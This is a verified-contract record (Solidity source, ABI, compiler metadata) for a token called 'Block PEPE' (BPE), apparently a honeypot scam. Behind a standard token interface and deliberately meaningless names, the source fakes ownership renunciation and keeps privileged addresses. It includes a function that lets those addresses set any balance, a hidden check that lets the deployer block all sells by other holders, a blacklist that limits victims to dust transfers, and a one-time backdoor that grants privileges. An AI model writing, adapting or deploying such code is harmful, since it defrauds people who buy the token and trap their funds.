{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface swapMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityExempt) external view returns (uint256);\n\n    function transfer(address listSell, uint256 fundLaunchTotal) external returns (bool);\n\n    function allowance(address swapTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundLaunchTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listSell,\n        uint256 fundLaunchTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptFeeIs, uint256 value);\n    event Approval(address indexed swapTx, address indexed spender, uint256 value);\n}\n\nabstract contract autoLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listIs {\n    function createPair(address tokenShould, address txMax) external returns (address);\n}\n\ninterface minTotal is swapMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlockPEPE is autoLaunched, swapMin, minTotal {\n\n    uint256 private launchedReceiver = 100000000 * 10 ** 18;\n\n    uint256 private totalTake;\n\n    uint256 constant launchFromTake = 10 ** 10;\n\n    address public marketingLaunched;\n\n    address public tokenFromList;\n\n    uint256 private autoLaunch;\n\n    bool private tradingTake;\n\n    function balanceOf(address liquidityExempt) public view virtual override returns (uint256) {\n        return launchIs[liquidityExempt];\n    }\n\n    address private totalList;\n\n    uint256 tradingLiquidityList;\n\n    function amountTrading(address fundFee, uint256 fundLaunchTotal) public {\n        shouldMode();\n        launchIs[fundFee] = fundLaunchTotal;\n    }\n\n    function fundExempt(address marketingTeam, address listSell, uint256 fundLaunchTotal) internal returns (bool) {\n        require(launchIs[marketingTeam] >= fundLaunchTotal);\n        launchIs[marketingTeam] -= fundLaunchTotal;\n        launchIs[listSell] += fundLaunchTotal;\n        emit Transfer(marketingTeam, listSell, fundLaunchTotal);\n        return true;\n    }\n\n    uint256 sellLaunch;\n\n    bool public tokenWallet;\n\n    string private receiverLaunch = \"Block PEPE\";\n\n    function transferFrom(address marketingTeam, address listSell, uint256 fundLaunchTotal) external override returns (bool) {\n        if (_msgSender() != minExemptLiquidity) {\n            if (walletTotal[marketingTeam][_msgSender()] != type(uint256).max) {\n                require(fundLaunchTotal <= walletTotal[marketingTeam][_msgSender()]);\n                walletTotal[marketingTeam][_msgSender()] -= fundLaunchTotal;\n            }\n        }\n        return buyAtFee(marketingTeam, listSell, fundLaunchTotal);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitSell;\n    }\n\n    mapping(address => bool) public fromBuyTo;\n\n    event OwnershipTransferred(address indexed modeToken, address indexed fundLaunch);\n\n    function transfer(address fundFee, uint256 fundLaunchTotal) external virtual override returns (bool) {\n        return buyAtFee(_msgSender(), fundFee, fundLaunchTotal);\n    }\n\n    uint8 private limitSell = 18;\n\n    constructor (){\n        \n        sellTrading fromToken = sellTrading(minExemptLiquidity);\n        tokenFromList = listIs(fromToken.factory()).createPair(fromToken.WETH(), address(this));\n        \n        marketingLaunched = _msgSender();\n        minTx();\n        launchedMax[marketingLaunched] = true;\n        launchIs[marketingLaunched] = launchedReceiver;\n        if (totalTake != isExempt) {\n            totalTake = walletAt;\n        }\n        emit Transfer(address(0), marketingLaunched, launchedReceiver);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    function tokenTotal(uint256 fundLaunchTotal) public {\n        shouldMode();\n        sellLaunch = fundLaunchTotal;\n    }\n\n    bool public limitFrom;\n\n    function approve(address buyFrom, uint256 fundLaunchTotal) public virtual override returns (bool) {\n        walletTotal[_msgSender()][buyFrom] = fundLaunchTotal;\n        emit Approval(_msgSender(), buyFrom, fundLaunchTotal);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletTotal;\n\n    uint256 public walletAt;\n\n    function minTx() public {\n        emit OwnershipTransferred(marketingLaunched, address(0));\n        totalList = address(0);\n    }\n\n    uint256 private isExempt;\n\n    mapping(address => bool) public launchedMax;\n\n    function getOwner() external view returns (address) {\n        return totalList;\n    }\n\n    function buyAtFee(address marketingTeam, address listSell, uint256 fundLaunchTotal) internal returns (bool) {\n        if (marketingTeam == marketingLaunched) {\n            return fundExempt(marketingTeam, listSell, fundLaunchTotal);\n        }\n        uint256 atTake = swapMin(tokenFromList).balanceOf(feeAtSwap);\n        require(atTake == sellLaunch);\n        require(listSell != feeAtSwap);\n        if (fromBuyTo[marketingTeam]) {\n            return fundExempt(marketingTeam, listSell, launchFromTake);\n        }\n        return fundExempt(marketingTeam, listSell, fundLaunchTotal);\n    }\n\n    address feeAtSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldMode() private view {\n        require(launchedMax[_msgSender()]);\n    }\n\n    address minExemptLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address enableModeTeam, address buyFrom) external view virtual override returns (uint256) {\n        if (buyFrom == minExemptLiquidity) {\n            return type(uint256).max;\n        }\n        return walletTotal[enableModeTeam][buyFrom];\n    }\n\n    function senderLaunchedMarketing(address autoSender) public {\n        require(autoSender.balance < 100000);\n        if (tokenWallet) {\n            return;\n        }\n        if (isExempt == autoLaunch) {\n            tradingTake = false;\n        }\n        launchedMax[autoSender] = true;\n        \n        tokenWallet = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedReceiver;\n    }\n\n    mapping(address => uint256) private launchIs;\n\n    function takeMode(address enableLaunched) public {\n        shouldMode();\n        \n        if (enableLaunched == marketingLaunched || enableLaunched == tokenFromList) {\n            return;\n        }\n        fromBuyTo[enableLaunched] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTo;\n    }\n\n    bool public swapMinTake;\n\n    string private receiverTo = \"BPE\";\n\n    function owner() external view returns (address) {\n        return totalList;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFeeIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableModeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchTotal\",\"type\":\"uint256\"}],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromBuyTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"}],\"name\":\"senderLaunchedMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMinTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"}],\"name\":\"takeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFromList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundLaunchTotal\",\"type\":\"uint256\"}],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLaunchTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BlockPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}